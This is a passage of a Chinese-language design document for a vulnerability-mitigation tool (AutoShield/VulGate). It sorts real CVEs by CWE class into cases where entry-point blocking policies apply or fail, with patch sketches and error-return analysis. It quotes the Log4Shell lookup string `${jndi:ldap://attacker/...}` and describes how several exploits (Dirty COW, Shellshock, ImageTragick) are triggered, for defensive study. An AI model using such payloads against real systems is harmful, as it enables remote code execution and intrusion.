**漏洞原理：** IMAP mailbox 名称会被转换成本地缓存或邮箱路径。旧代码允许名称中出现独立的 `..` 路径段，路径拼接和规范化后就可能从预期 mailbox 根目录退到父目录，使攻击者访问根目录之外的文件。

**真实补丁：** 在 mailbox 名称进入路径处理前拒绝独立的 `..` 路径段：

```c
if (contains_parent_segment(mailbox))
    return NULL;
```

**AutoShield 判断：** 该协议中的 mailbox 字符串在函数入口已经完整，检查语义也不依赖文件系统竞态，因此可以形成入口 Policy。Policy 必须复现“路径段”语义，而不是简单搜索任意两个点字符。

**错误返回值合法性：** 上游在同一 mailbox/path 构造路径使用 `NULL`，可作为候选，但指针返回尤其需要 RUP：所有调用者必须先判空并停止文件访问，不能直接解引用，也不能把 `NULL` 解释为“使用默认 mailbox”、缓存未命中后改走不受保护路径，或无界重试解析。任一调用点不满足时应改挂到可返回显式 IMAP/路径错误的上层入口。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-14355)、[Mutt 补丁 31eef6c](https://gitlab.com/muttmua/mutt/-/commit/31eef6c766f47df8281942d19f76e35f475c781d)。

**不适用反例：CVE-2018-15664，Docker `docker cp` symlink-exchange。**

**漏洞原理：** `docker cp` 先解析和检查容器内路径，再由 daemon 以 root 身份执行归档读写。容器内攻击进程可以在“路径已经检查”和“daemon 实际打开路径”之间，把普通目录替换为指向宿主机的符号链接。检查时路径安全、使用时却已指向宿主文件，形成典型 symlink-exchange TOCTOU。

**真实补丁：** 在归档期间暂停容器，以冻结文件系统：

```text
pause container → perform archive operation → unpause container
```

**AutoShield 判断：** 只在入口读取一次 canonical path 不能保证后续使用的是同一对象；真正修复需要改变并发状态或使用原子对象绑定，超出只读入口 Policy 的能力。

**错误返回值合法性：** 不适用。即使为 `docker cp` 选择一个表面合法的失败码，也只能禁用某次操作，不能证明已检查对象与随后使用对象一致；返回值正确不能弥补 TOCTOU 判定失效。若选择整项禁用作为独立缓解，仍须在 daemon API 层使用既有非重试错误并验证客户端不会自动重试，但这不属于本实例的细粒度修复。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-15664)、[Moby 修复 PR 39252](https://github.com/moby/moby/pull/39252)。

### 10.8 CWE-770：未限额资源分配

**适用正例：CVE-2018-16645，ImageMagick BMP/DIB 过量内存分配。**

**漏洞原理：** BMP/DIB 文件头声明颜色表条目数，decoder 根据该值为颜色表分配内存。旧代码没有把声明值与文件实际大小建立合理关系，攻击者可以在很小的文件中声明巨大的颜色数，诱导进程进行与输入规模不成比例的大额分配并耗尽内存。

**真实补丁：** 把颜色数与输入文件实际大小比较，在大分配发生前拒绝不合理元数据：

```c
if (number_colors > input_blob_size)
    return CORRUPT_IMAGE;
```

**AutoShield 判断：** 颜色数和 blob 大小在 decoder 入口可读，错误返回路径明确，因此适合入口 Policy。实现时还应加入乘法溢出和部署配额检查。

**错误返回值合法性：** 候选动作应复用 ImageMagick 同一 decoder 的 `CORRUPT_IMAGE`/对应异常宏路径，而不是返回通用整数。必须确认该路径会销毁本次部分图像对象、停止后续像素读取，并且上层不会把该错误当作“尝试其他 coder”而再次对同一不可信输入进行高成本解析；否则可能从内存耗尽转化为 fallback 或重试放大。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-16645)、[ImageMagick 补丁 ecb31db](https://github.com/ImageMagick/ImageMagick/commit/ecb31dbad39ccdc65868d5d2a37f0f0521250832)。

**不适用反例：CVE-2019-9511，HTTP/2 Data Dribble。**

**漏洞原理：** 攻击者建立多个 HTTP/2 stream，请求服务器产生大量响应数据，同时反复操纵 flow-control window 和 stream priority，使实现把待发送数据切成大量 1 字节队列项。单个帧和单个请求都可能完全合法，但长时间组合会消耗大量 CPU 和内存。

**真实补丁/缓解：** 各实现需要在连接级调整调度、窗口、队列上限和速率限制，而不是只拒绝某一种固定帧。

**AutoShield 判断：** 风险取决于跨时间帧序列、累计排队成本和实现调度行为。若没有可靠的有界 Observer 和时间/连接状态，单入口只读 Policy 无法判定该攻击。

**错误返回值合法性：** 不适用。在尚不能可靠识别攻击序列时，选择 stream error、connection error 或静默丢帧都可能误伤正常流量；可重试的 HTTP/2 错误还可能增加帧数和工作量。只有针对具体实现确定限速点后，才能验证应关闭连接、拒绝新 stream 还是返回不可重试错误，不能预设统一返回值。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2019-9511)、[CERT HTTP/2 DoS 公告](https://kb.cert.org/vuls/id/605641/)。

### 10.9 CWE-416：Use-After-Free

**适用正例：CVE-2022-2588，Linux `cls_route` handle 0 过滤器 UAF。**

**漏洞原理：** `cls_route` 用 hashtable 保存 route filter。替换 handle 为 0 的旧 filter 时，旧代码释放了 filter 对象，却没有先从 hashtable 删除对应节点。表中因此保留一个指向已释放内存的指针；后续查找或遍历再次访问该节点时形成 UAF。

**真实补丁：** 确保旧对象在释放前从 hash 中移除，使对象生命周期和容器成员关系同步。

**AutoShield 判断：** 可以在 filter replace/delete 入口拒绝触发该错误路径的 handle 0 组合，或由 Observer 维护 filter 是否仍在 hash 中的私有状态：

```text
BLOCK：操作会释放 handle=0 且对象仍标记为 hashed
```

**错误返回值合法性：** 当前证据只支持危险谓词，不足以支持一个具体错误码。必须在实际选定的 `tc` replace/delete 入口复用其既有拒绝路径，并比较 `-EINVAL`、`-ENOENT`、`-EBUSY` 等语义；尤其要验证 iproute2 或控制器不会对“忙/暂时失败”无限重试，也不会在失败后继续使用已缓存的 filter handle。在确定 hook 与全调用点前应标为待验证。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2022-2588)、[上游补丁讨论](https://lore.kernel.org/netdev/20220809170518.164662-1-cascardo@canonical.com/)。

**不适用反例：CVE-2021-0920，Linux/Android Unix socket garbage collection UAF。**

**漏洞原理：** Unix socket garbage collector 会把“引用只来自在途消息”的 socket 标为回收候选。另一个线程使用 `MSG_PEEK` 时，可以复制消息中的 file reference 并把它安装成新的 fd，但该操作不会像普通 dequeue 一样更新 inflight 引用。若 GC 恰好在“引用计数变化”和“fd 安装”之间运行，就可能仍把对象当候选释放，随后新 fd 指向已释放对象。

**真实补丁：** 在安装 fd 前使用 `unix_gc_lock` 建立序列化屏障：

```text
duplicate file reference → acquire/release unix_gc_lock → install fd
```

**AutoShield 判断：** 入口快照无法预测之后是否与 garbage collection 交错；不改变同步关系的只读 Policy 不能根治该实例。

**错误返回值合法性：** 不适用。任意 socket 错误只能粗暴拒绝 `MSG_PEEK` 或 fd 安装，不能建立补丁所需的 GC 序列化屏障；若返回可重试的 `-EAGAIN`，调用方还可能形成忙重试。除非明确将“禁用相关功能”作为单独策略并验证不可重试错误契约，否则不能用返回值选择把本例改判为适用。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-0920)、[Android 公告及上游提交](https://source.android.com/docs/security/bulletin/2021-11-01)、[提交 cbcf011](https://android.googlesource.com/kernel/common/+/cbcf01128d0a92e131bd09f1688fe032480b65ca)。

### 10.10 CWE-415：Double Free

**适用正例：CVE-2017-2636，Linux `n_hdlc` 竞态 double free。**

**漏洞原理：** `n_hdlc` 用共享指针 `tbuf` 保存发送失败后等待重传的 buffer。一个线程恢复发送，另一个线程同时 flush 发送队列时，两条路径都可能读取同一个 `tbuf`，并分别把它放回 free list。设备关闭时 free list 被遍历，同一 buffer 因出现两次而被释放两次。

**真实补丁：** 移除共享的 `tbuf` 设计，改用受锁保护的标准内核链表，使 buffer 只有一个明确归属。

**AutoShield 判断：** 临时缓解可以用受控 Observer 维护每个 line discipline 的发送/flush in-flight 标记，在冲突操作入口阻断第二个操作：

```text
BLOCK：同一 n_hdlc 对象已有互斥的 send/flush 操作 in flight
```

这依赖原子、私有且有界的 Observer 状态；当前单入口原型尚不具备。

**错误返回值合法性：** 待验证。发送、write-wakeup 与 flush 入口的签名和调用语义不同，不能共用一个返回值；对 `void` flush 静默返回可能违背“队列已清空”的承诺，对可返回错误的写入口使用 `-EAGAIN`/`-EBUSY` 又可能触发用户态忙重试。只有选定一个能够明确报告“本次操作未执行”的 hook，并验证等待者唤醒、队列状态和重试上界后，该 Observer 方案才具备合法阻断动作。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2017-2636)、[Linux 补丁 82f2341](https://github.com/torvalds/linux/commit/82f2341c94d270421f383641b7cd670e474db56b)、[漏洞与修复说明](https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html)。

**不适用反例：CVE-2021-3492，Ubuntu shiftfs fault path 的 double free/泄漏。**

**漏洞原理：** shiftfs 先分配两个内核对象，再执行 `copy_from_user()`、文件获取和 fd 安装。旧代码在不同内部步骤失败时走不同 return 分支：有的分支释放对象但仍把旧指针暴露给调用者，造成再次释放；另一些分支直接返回而遗漏释放。相同入口参数可能因用户页 fault 时机不同而表现为 double free 或 leak。

**真实补丁：** 初始化输出指针，把多个失败分支统一转到 `err_free`，并且只在所有步骤成功后发布对象：

```text
allocate v1/v2 → internal operations → success: publish
                                  └→ failure: free exactly once
```

**AutoShield 判断：** 入口无法知道 `copy_from_user()` 是否会在本次内部执行中 fault，也无法用只读 Policy 复现精确清理，因此该实例不适合入口提前返回之外的细粒度修复。

**错误返回值合法性：** 不适用。`-EFAULT` 等错误码本身可能是该 API 的合法失败，但 AutoShield 在入口既不知道本次是否会 fault，也无法在内部对象已分配后执行补丁要求的“恰好释放一次”。提前返回与内部失败返回处于不同资源阶段，不能因错误码相同就视为等价。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-3492)、[Ubuntu 补丁 8fee52a](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/focal/patch/?id=8fee52ab9da87d82bc6de9ebb3480fff9b4d53e6)、[补充补丁 25c891a](https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/focal/patch/?id=25c891a949bf918b59cbc6e4932015ba4c35c333)。

### 10.11 CWE-362：竞态

**适用正例：CVE-2017-2636，已知冲突操作序列。**

**漏洞原理：** 同一 `n_hdlc` 对象的发送恢复路径和 flush 路径并发访问唯一的 `tbuf`，缺少统一所有权和同步，使两条路径都认为自己可以把 buffer 归还 free list。

**真实补丁：** 消除独立共享 `tbuf`，使用锁保护的链表统一管理 buffer 所有权。

**AutoShield 判断：** 危险组合可以压缩为“同一对象的发送恢复与 flush 同时 in flight”。如果 Observer 能原子记录每对象状态，Interceptor 可以在第二个冲突操作入口暂时拒绝，从而避免已知竞态窗口。

**错误返回值合法性：** 待验证，理由与 10.10 相同。若选择阻断 flush，必须证明调用者能得知 flush 未完成；若选择阻断发送恢复，必须证明 buffer 不会永久滞留且不会形成持续 wakeup/重试。返回动作是该竞态缓解是否成立的一部分，当前不能只凭 Observer 能检测冲突就判为可部署。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2017-2636)、[Linux 补丁 82f2341](https://github.com/torvalds/linux/commit/82f2341c94d270421f383641b7cd670e474db56b)。

**不适用反例：CVE-2016-5195，Dirty COW。**

**漏洞原理：** 攻击线程反复对只读私有映射调用 `madvise(MADV_DONTNEED)`，另一个线程同时通过 `/proc/self/mem` 或类似路径写入。COW fault、页表更新和 `get_user_pages()` 重试发生特定交错时，内核可能错误地把底层只读文件页当作可写页返回，从而修改本不应写入的文件。

**真实补丁：** 改变 `get_user_pages()` 对 `FOLL_WRITE`、dirty PTE 和 COW 重试的处理，修复页表/COW 状态机，而不是增加一个输入黑名单。

**AutoShield 判断：** 入口读取的页状态可能在返回 Policy 后立即失效，攻击本身又依赖多个系统调用的精确交错，因此没有原子快照或同步控制时必须判为 out-of-scope。

**错误返回值合法性：** 不适用。对 `madvise`、`write` 或 GUP 路径返回任意错误，都不能修复页表/COW 状态机；选择 `-EAGAIN` 还可能强化攻击所需的重试交错。只有整项禁用某接口时才能另行验证其错误契约，但那是功能禁用型 workaround，不是本例所述入口修复。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2016-5195)、[Linux 修复提交 19be0ea](https://github.com/torvalds/linux/commit/19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619)。

### 10.12 CWE-367：TOCTOU

**条件适用示例：CVE-2020-25212，Linux NFS size check 放置错误。**

**漏洞原理：** NFS client 把目标 buffer 容量放在 `label->len` 中传入解码流程。旧版 `nfs4xdr.c` 从响应解析出实际 label 长度后，先按该长度执行 `memcpy()`，再把 `label->len` 覆盖为解析长度；更上层 `nfs4proc.c` 随后才比较原始 `buflen`。因此检查发生在使用之后，发现长度不足时越界复制已经完成。这是放置错误导致的 check/use 不一致，不要求攻击者在两个时刻并发修改同一个值。

**真实补丁：** 把检查移到实际 `memcpy` 旁边，并使用与复制完全相同的长度：

```c
if (destination_length < encoded_label_length)
    return -ERANGE;
memcpy(destination, source, encoded_label_length);
```

**AutoShield 判断：** 直接读取函数入口参数仍然不够，因为 `encoded_label_length` 要在 `decode_attr_security_label()` 内部推进 XDR cursor 后才出现。改进设计可以把该函数视为安全失败边界：在入口创建私有 XDR cursor，只读重放 `lfs/pi/len` 的解析前缀，得到本次 `memcpy()` 真正使用的长度；若目标容量不足，则不执行真实函数并返回 `-ERANGE`。这样既不推进真实 cursor，也让上层已有的 `status < 0 -> goto xdr_error` 路径负责退出。该方案需要安全的 XDR typed adapter、私有 cursor 和全调用点验证；当前 VulGate 原型尚未实现，完整 DSL 见 [PATCH_DSL_CASE_STUDIES.md](PATCH_DSL_CASE_STUDIES.md)。

**错误返回值合法性：** `decode_attr_security_label()` 本身已有负错误传播契约，因此 `-ERANGE` 是候选合法动作；但仍必须确认全部调用者会终止本次解码、释放请求资源，而且不会把它当成可无限重试的信号。若从更早的 NFS 请求入口直接返回同一错误，资源阶段和协议语义不同，不能视为等价。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2020-25212)、[Linux 补丁 b4487b9](https://github.com/torvalds/linux/commit/b4487b93545214a9db8cbf32e86411677b0cca21)。

**不适用反例：CVE-2018-15664，Docker symlink-exchange。**

**漏洞原理：** daemon 检查容器路径时看到的是安全目录，但容器进程可在 daemon 实际打开路径前把目录换成宿主路径 symlink。检查对象和使用对象不是同一个稳定 inode。

**真实补丁：** 归档操作期间暂停容器，阻止攻击进程继续替换文件系统对象。

**AutoShield 判断：** 只读入口检查无法提供冻结或原子对象绑定，因此它是 CWE-367 不能仅靠 canonical path 修复的典型反例。

**错误返回值合法性：** 不适用。错误返回只能报告某次检查失败，无法冻结 inode 或保证 use 阶段仍是同一对象；客户端自动重试反而会重新打开竞争窗口。因此返回值再“合法”也不能补足缺失的原子性。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2018-15664)、[Moby 修复 PR 39252](https://github.com/moby/moby/pull/39252)。

### 10.13 CWE-78/77：命令或代码参数注入

**适用正例：CVE-2014-6271，GNU Bash Shellshock。**

**漏洞原理：** Bash 支持从环境变量导入形如 `() { ...; }` 的函数定义。旧 parser 在函数定义结束后没有停止，而是继续把同一环境变量中的尾随文本当作普通 shell 命令执行。网络服务只要把攻击者输入放入环境变量并启动 Bash，尾随命令就会继承服务权限执行。

**真实补丁：** 限制环境函数导入 parser，只接受完整且独立的函数定义，不再执行定义后的额外 token。

**AutoShield 判断：** 完整环境变量值在导入入口可见，可以只允许严格函数定义语法，并在函数结束后仍有 token 时阻断：

```text
ALLOW：完整值恰好是一条合法函数定义
BLOCK：函数定义结束后仍存在命令 token
```

初始修复不完整并产生 CVE-2014-7169，说明 Policy 必须使用完整 parser 语义和独立变体测试，不能只搜索固定字符串。

**错误返回值合法性：** 待验证，不能给 Bash 的环境导入路径直接注入通用整数错误。安全候选动作应与 parser 的既有语义一致：拒绝导入该环境函数、清除其函数属性并继续 shell 初始化，或让当前非交互命令以明确解析失败终止；二者的可用性和安全效果不同。必须验证不会保留半解析函数、转而执行尾随 token、回退到另一解析路径或被 CGI/服务管理器无界重启。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2014-6271)、[GNU Bash 4.3 patch 25](https://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-025)、[Red Hat 分析](https://access.redhat.com/articles/1200223)。

**不适用反例：CVE-2016-3714，ImageMagick ImageTragick。**

**漏洞原理：** ImageMagick 会根据图像协议选择 delegate，把文件名、URL 或图像内容代入外部命令模板。攻击者把 shell 元字符放入 MVG、URL 或文件名；这些字符经过 coder 解析、delegate 模板替换后进入 shell，最终成为额外命令。危险字符串在原始文件中和最终命令中的形态可能不同。

**真实补丁/缓解：** 禁用危险 coder/delegate，并修改外部命令调用和转义逻辑，减少进入 shell 的可控文本。

**AutoShield 判断：** 当前受限 IR 若不能完整复现 delegate 与 shell 编码语义，就不能可靠区分合法文件名与命令注入；简单黑名单容易被编码和协议组合绕过。

**错误返回值合法性：** 不适用。选择 coder failure、文件不存在或 delegate failure 中的任一错误，都不能弥补危险字符串识别不完整；某些错误还会促使 ImageMagick 尝试其他 coder/delegate，形成不安全 fallback。只有在具体危险 coder 入口整项禁用并验证“不可回退”错误路径时，才能作为独立 workaround 评估。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2016-3714)、[ImageMagick 安全说明](https://imagemagick.org/script/security-policy.php)、[CERT VU#250519](https://www.kb.cert.org/vuls/id/250519)。

### 10.14 CWE-89：SQL 注入

**适用正例：CVE-2013-7262，MapServer PostGIS TIME filter SQL 注入。**

**漏洞原理：** WMS TIME 参数由远程请求提供，`msPostGISLayerSetTimeFilter()` 把它直接拼接进 PostGIS SQL 条件。攻击者插入 quote、反斜杠和 SQL 片段即可提前结束原字符串并追加自己的查询逻辑。

**真实补丁：** 在拼接 SQL 前拒绝 quote 和反斜杠：

```c
if (contains_quote_or_backslash(time_string))
    return MS_FALSE;
```

**AutoShield 判断：** TIME filter 字符串和 SQL sink 在同一入口上下文中可见，并有明确错误返回，适合临时入口 Policy。长期修复仍应优先使用参数化查询，而不是扩展字符黑名单。

**错误返回值合法性：** 同一函数已有的 `MS_FALSE` 是候选合法，但必须确认调用者将其解释为 TIME filter 构造失败并放弃执行 SQL，而不是布尔“无过滤条件”、空 filter 或继续使用旧 filter。还要检查 WMS 层返回不可自动重试的客户端错误，避免代理或任务框架对同一恶意请求重复执行。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2013-7262)、[MapServer 补丁 3a10f6b](https://github.com/MapServer/MapServer/commit/3a10f6b829297dae63492a8c63385044bc6953ed)。

**边界/条件适用示例：CVE-2020-35700，LibreNMS second-order SQL 注入。**

**漏洞原理：** 攻击者通过 widget 设置接口提交恶意 `sort_order`，该值第一次请求中只被保存，不立即执行。之后其他用户加载 Top Devices widget 时，服务从数据库取出该值并拼接到 raw SQL 的排序方向中，payload 才在第二阶段执行，因此称为 second-order injection。

**真实补丁：** 为排序方向建立严格的 `ASC/DESC` 白名单，并在消费点对非法值使用安全默认值。

**AutoShield 判断：** 该案例不能笼统判为不适用。如果拦截点位于 `/ajax/form/widget-settings` 写入入口，并能看到完整的 `sort_order`，则可以直接执行 `sort_order ∈ {ASC, DESC}` 白名单，拒绝非法值后阻止污染进入数据库，不需要跨请求 Observer。如果只能看到一个没有字段语义的通用保存函数，或者只能看到不含最终排序值的查询入口，则仍应 UNKNOWN。官方消费点默认 `ASC` 的修复属于值替换；只读 VulGate 不能直接完成替换，只能在有合法 4xx 契约的写入/消费边界拒绝。

**错误返回值合法性：** 在写入入口，候选动作是该设置 API 既有的不可重试 4xx 验证错误，并需确认非法值不会先写入数据库；在消费入口，官方补丁的安全默认值 `ASC` 需要可写 adapter，当前只读 Policy 不能假装完成该替换。若只能返回数据库错误或可重试失败，可能触发页面重试/fallback，动作不合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2020-35700)、[LibreNMS 修复 PR 12422](https://github.com/librenms/librenms/pull/12422)。

### 10.15 CWE-94/502：代码注入或反序列化

**适用正例：CVE-2021-44228，Log4Shell。**

**漏洞原理：** Log4j 会对日志消息中的 `${...}` 表达式执行递归 lookup。攻击者把 `${jndi:ldap://attacker/...}` 放入可记录的 header、用户名等字段，Log4j 解析后调用 JNDI 连接远程命名服务，并可能加载或实例化攻击者控制的对象，造成远程代码执行。

**真实补丁：** 从限制 JNDI 逐步升级为默认禁用 message lookup，并在 2.16.0 移除相关自动 lookup 行为。

**AutoShield 判断：** 若 Interceptor 挂在 JNDI lookup 入口，此时 lookup 名称和 scheme 已完整可见，可以临时阻断 LDAP/RMI 等不允许的远程命名协议：

```text
BLOCK：lookup scheme 不在本地、固定白名单中
```

挂在普通日志 API 入口则可能看不到递归 substitution 后的最终 lookup，因此检测点选择是适用前提。

**错误返回值合法性：** 待验证。JNDI/Log4j 路径可能使用 `null`、抛出异常或返回未解析文本；`null` 可能被解释为 lookup miss 并触发其他 lookup/fallback，保留 `${jndi:...}` 又可能被递归重处理，未捕获异常则可能让业务请求或日志线程崩溃。候选动作必须使用 Java 类型化 adapter，并证明远程 lookup 被终止、字符串不会再次求值、日志调用方不会无界重试后，才能 ENFORCE。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-44228)、[Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security.html)。

**不适用反例：CVE-2015-4852，Oracle WebLogic Java 反序列化 gadget chain。**

**漏洞原理：** WebLogic T3 接口接受 Java serialized object。攻击者构造包含 Commons Collections 等 gadget 的对象图；`ObjectInputStream` 恢复对象时会自动调用 `readObject()`、比较器或反射方法，使多个看似正常的类连接成最终执行命令的调用链。危险性取决于整个对象图和服务器 classpath，而不是某个固定字符串。

**真实补丁：** 更新或限制可反序列化类、协议入口和危险 gadget，收紧 WebLogic T3 反序列化边界。

**AutoShield 判断：** 当前 VM 不解析 Java 对象图，也没有类解析和 gadget 语义；在字节流入口用字符串黑名单无法覆盖等价对象图，因此应标记为 out-of-scope。

**错误返回值合法性：** 不适用。反序列化 API 的异常虽然可以合法终止对象构造，但当前 Policy 不能可靠判定何时应抛出；随意返回 `null` 还可能让调用者使用默认对象或走其他反序列化器。只有整项禁用 T3/Java 序列化入口并验证协议级不可重试拒绝时，才能作为不同粒度的缓解。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2015-4852)、[Oracle 安全警报](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html)。

### 10.16 CWE-862/863/639：授权错误与 IDOR

**适用正例：CVE-2023-35164，DataEase dashboard 缺少授权检查。**

**漏洞原理：** 后端 dashboard 更新接口依据客户端提供的 dashboard ID 定位对象，却没有验证当前登录用户是否拥有该 dashboard 或具备编辑权限。已认证但低权限的用户只要获得管理员 dashboard ID，就能直接调用接口修改他人的资源，形成 IDOR/缺失授权。

**真实补丁：** 在后端操作中补充当前主体对目标 dashboard 的 ownership/ACL 校验，而不是依赖前端隐藏按钮。

**AutoShield 判断：** 若入口已经提供 authenticated subject、dashboard ID、操作类型和权威 ownership/ACL 状态，Policy 可以在调用业务函数前比较四元组：

```text
(subject, resource, operation, current_acl) → allow / block
```

**错误返回值合法性：** 候选动作不是通用 `-13`，而是该 Web 框架既有的授权拒绝响应，例如一致的 403/业务错误 envelope。必须确认客户端不会把它当作认证过期而自动刷新凭据并循环重试，也不能返回 404/空对象后转入“新建 dashboard”或默认资源 fallback；具体响应契约和事务未开始这一事实通过验证前，状态为待验证。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2023-35164)、[DataEase 公告 GHSA-grxm-fc3h-3qgj](https://github.com/dataease/dataease/security/advisories/GHSA-grxm-fc3h-3qgj)。

**边界案例（早期缓存拦截点不适用）：CVE-2021-22253，GitLab 权限撤销后仍可触发 protected deployment。**

**漏洞原理：** 用户在拥有 protected environment 部署权限时创建或接触到 deployment/pipeline 状态，随后管理员撤销其权限。旧逻辑在后续触发部署时复用已有状态或早先授权结果，没有重新对当前用户执行实时授权，因此被撤权用户仍能部署。

**真实补丁：** 在实际部署执行时重新验证当前权限，并正确处理已存在的 pipeline/deployment 状态与权限版本。

**AutoShield 判断：** 如果 Interceptor 只能读取创建 pipeline 时缓存的权限，而不能访问执行时的权威 ACL 和状态版本，就会错误放行，必须 UNKNOWN。若拦截点位于最终 redeploy/trigger 服务端操作，并且在创建或重新入队 job 前能读取当前主体、目标 protected environment 和权威 ACL，设计上可以拒绝无权限请求；后台 worker 在真正执行 deployment 前还应再次核验，以覆盖检查与执行之间的撤权竞态。当前 VulGate 没有该 ACL Oracle、跨阶段拦截或 worker adapter，因此本例当前仍不支持。

**错误返回值合法性：** 在执行时权威授权点，已认证但无权限应使用框架既有的 403/AccessDenied 语义，并且在 job 创建或重新入队前终止操作；已经入队的 job 应标记为不可重试的授权失败。对陈旧权限入口返回 403 仍不能证明安全，返回可重试失败还会造成 job 重试循环。当前 VulGate 缺少 HTTP/后台任务 typed adapter，不能直接部署该动作。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-22253)、[GitLab issue 323794](https://gitlab.com/gitlab-org/gitlab/-/issues/323794)。

### 10.17 CWE-306：关键功能缺少认证

**适用正例：CVE-2023-26035，ZoneMinder snapshot action 缺少权限检查。**

**漏洞原理：** snapshot action 接受客户端传入的 monitor 标识，但旧代码既没有确认调用者是否有权查看/操作该 monitor，也允许把本应为数值 ID 的参数当成对象数据继续处理。恶意参数最终进入 `TriggerOn` 和 `shell_exec`，使未认证请求能够到达关键命令执行功能。

**真实补丁：** 在 action 入口加入认证/授权检查和严格的 monitor ID 类型验证，确保只有有权限的主体才能触发 snapshot。

**AutoShield 判断：** 主体、action、monitor ID 和认证上下文在请求入口均可见时，可以直接拒绝未认证或未授权调用。

**错误返回值合法性：** 候选动作应区分未认证与已认证但无权限，复用 ZoneMinder/Web 层既有的 401/403 或应用错误响应，而不是返回成功页面、空 snapshot 或通用整数。需验证响应在调用 `TriggerOn`/`shell_exec` 和任何状态修改之前产生，并确认浏览器、反向代理和前端不会对该非幂等 action 自动重试；目前应标为待验证而非已证明合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2023-26035)、[ZoneMinder 公告 GHSA-72rg-h4vf-29gr](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr)。

**不适用反例：CVE-2021-26855，Microsoft Exchange ProxyLogon。**

**漏洞原理：** Exchange Client Access 前端会把请求代理到后端服务。攻击者构造特殊 URL、cookie 和 header，利用前端 SSRF/路由缺陷选择内部后端并伪造 Exchange 特有身份信息，使后端把来自未认证外部用户的请求当成内部可信请求处理。漏洞横跨前端代理、后端路由和 token 信任边界。

**真实补丁：** 收紧前端到后端的目标选择、请求路由和认证信息绑定，防止外部输入伪造内部代理身份。

**AutoShield 判断：** 若入口只看到局部 header，而看不到可信代理身份、后端目标和 token 绑定关系，就无法构造可靠认证谓词。该例只能由具备完整跨组件认证上下文的部署考虑，否则 out-of-scope。

**错误返回值合法性：** 不适用。在错误信任边界上返回 401、403 或代理错误，都不能保证请求没有被路由到错误后端；某些 401 还会触发客户端重新认证，某些 5xx 会触发代理重试。必须先选择具有完整身份绑定的拦截点，再对该层既有的终止型认证错误做 RUP 验证。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-26855)、[Microsoft MSRC 公告](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855)。

### 10.18 CWE-352：CSRF

**适用正例：CVE-2021-43846，Solidus add-to-cart CSRF。**

**漏洞原理：** 浏览器会自动携带用户在 Solidus 商店中的 session cookie。恶意网站可以诱导已登录用户的浏览器向 add-to-cart `populate` action 发送跨站请求；由于该 action 明确跳过 CSRF token 验证，服务无法区分用户主动操作和第三方网站伪造的请求，购物车状态会在用户不知情时被修改。

**真实补丁：** 删除 `populate` action 对 `verify_authenticity_token` 的跳过，使 add-to-cart 重新执行框架 CSRF token 验证：

```text
BLOCK：状态改变请求缺少与当前 session 绑定的有效 CSRF token
```

**AutoShield 判断：** token、session、HTTP method 和 action 在 controller 入口完整可见，因此是直接正例。

**错误返回值合法性：** 候选动作应复用 Rails 的 CSRF 失败路径（通常抛出 `ActionController::InvalidAuthenticityToken` 并由框架转换为 4xx），不能返回 `false`、`nil` 或正常页面。需要确认异常在购物车事务和 session 状态修改前产生，异常被统一捕获，且浏览器/Turbo/前端代码不会自动重放该状态改变请求；满足这些条件后才是合法的类型化异常动作。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-43846)、[Solidus 补丁 4d17cac](https://github.com/solidusio/solidus/commit/4d17cacf066d9492fc04eb3a0b16084b47376d81)、[安全公告](https://github.com/solidusio/solidus/security/advisories/GHSA-h3fg-h5v3-vf8m)。

**不适用反例：CVE-2022-0154，GitLab GitHub project import CSRF。**

**漏洞原理：** GitHub project import 不是单个同步请求，而是“用户发起导入 → 跳转 GitHub/OAuth → callback → 创建后台 import job”的多阶段流程。旧流程没有充分绑定发起导入的 GitLab session 与最终 GitHub 项目，攻击者可以准备自己的导入流程，再诱导受害者浏览器完成关键步骤，使攻击者项目被导入受害者账户。

**真实补丁：** 把 OAuth state、发起用户 session、callback 参数和最终 import job 进行不可替换的绑定，并在关键状态改变处验证 CSRF 上下文。

**AutoShield 判断：** 若 Interceptor 位于后台 import job 入口，只看到仓库和目标账户，而看不到原始浏览器 session 与 OAuth state，就无法判断请求是否为 CSRF。需要请求级跨组件上下文，否则应 UNKNOWN。

**错误返回值合法性：** 不适用。在后台 job 返回普通失败可能触发队列重试，返回成功又会掩盖未执行的导入；无论选哪种值，都不能补回缺失的 session/OAuth 绑定。若将拦截点移到 callback/状态验证层，应复用不可重试的 CSRF 异常，并确保不会创建 job。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2022-0154)、[GitLab issue 29580](https://gitlab.com/gitlab-org/gitlab/-/issues/29580)。

### 10.19 CWE-79：XSS

